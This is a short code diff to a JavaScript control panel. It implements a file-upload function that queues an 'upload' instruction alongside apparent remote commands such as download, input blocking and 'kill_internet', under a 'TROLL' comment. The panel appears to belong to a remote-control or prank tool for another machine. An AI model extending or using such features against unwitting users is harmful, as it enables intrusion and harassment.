@@ -177,7 +177,16 @@
             add_instruction(["download", document.querySelector("#download").value]);
         }
         function upload_file() {
-            // to be done
+            let form_data = new FormData();
+            form_data.append("file", document.querySelector("#upload").files[0]);
+            fetch("/upload_temp/", {
+                method: "POST",
+                body: form_data
+            }).then(response => {
+                return response.text();
+            }).then(file_id => {
+                add_instruction(["upload", document.querySelector("#upload").files[0].name, file_id]);
+            });
         }
         /*
         TROLL:
@@ -194,7 +203,8 @@
             add_instruction(["binput", document.querySelector("#binput").value]);
         }
         function play_sound() {
-            // to be done
+            // post
+            // add
         }
         function kill_internet() {
             add_instruction(["offnet", document.querySelector("#offnet").value]);
